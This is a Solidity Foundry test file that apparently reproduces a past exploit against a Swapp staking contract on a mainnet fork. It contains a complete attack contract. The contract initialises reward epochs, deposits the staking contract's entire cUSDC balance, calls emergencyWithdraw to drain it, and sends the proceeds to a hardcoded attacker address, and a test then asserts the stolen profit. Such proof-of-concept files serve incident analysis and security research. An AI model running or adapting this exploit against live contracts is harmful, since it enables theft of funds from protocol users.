
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    address constant PROFIT_TOKEN = Addresses.cUSDC;
    uint256 constant FORK_BLOCK = 22957532;
    uint256 constant TX_TIMESTAMP = 1752979823;
    uint256 constant TX_BLOCK_NUMBER = 22957533;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        SwappStakingAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (SwappStakingAttack attack) {
        _etchRuntime();
        attack = SwappStakingAttack(payable(ATTACK_CONTRACT));
    }

    function _prepareProfit(SwappStakingAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(SwappStakingAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(SwappStakingAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(ATTACKER_EOA, address(0), PROFIT_TOKEN, "cUSDC", 128657759164064);
    }
}

contract SwappStakingAttack {
    constructor() payable {}

    function attack() external payable {
        executeExploit();
    }

    function executeSetup() external payable {
        executeExploit();
    }

    function executeExploit() public {


        _initRewardEpochs();
        _approveStaking();
        _stakeAndWithdraw();
        _collectProfit();
    }

    function _initRewardEpochs() internal {
        uint128 currentEpoch = uint128(IStaking(Addresses.Staking).getCurrentEpoch());
        for (uint128 epoch; epoch <= currentEpoch; epoch++) {
            IStaking(Addresses.Staking).manualEpochInit(_assetList(), epoch);
        }
    }

    function _approveStaking() internal {
        IERC20Like(Addresses.cUSDC).approve(Addresses.Staking, type(uint256).max);
    }

    function _stakeAndWithdraw() internal {
        uint256 stakingTokenBalance = IERC20Like(Addresses.cUSDC).balanceOf(Addresses.Staking);
        IStaking(Addresses.Staking).deposit(Addresses.cUSDC, stakingTokenBalance, Addresses.ZERO);
        IStaking(Addresses.Staking).emergencyWithdraw(Addresses.cUSDC);
    }

    function _collectProfit() internal {
        uint256 profitTokenBalance = IERC20Like(Addresses.cUSDC).balanceOf(address(this));
        IERC20Like(Addresses.cUSDC).transfer(Addresses.attacker_eoa, profitTokenBalance);
    }

    receive() external payable {}

    fallback() external payable {}

    function _assetList() internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = Addresses.cUSDC;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Staking = 0x245a551ee0F55005e510B239c917fA34b41B3461;
    address internal constant cUSDC = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address internal constant attacker_eoa = 0x657a2b6Fe37CEd2F31fD7513095DBfb126a53601;
    address internal constant attack_contract = 0x7f1F536223d6a84Ad4897A675F04886cE1c3b7A1;
}

interface IStaking {
    function deposit(address, uint256, address) external;
    function emergencyWithdraw(address) external;
    function getCurrentEpoch() external view returns (uint256);
    function manualEpochInit(address[] calldata, uint128) external;
}
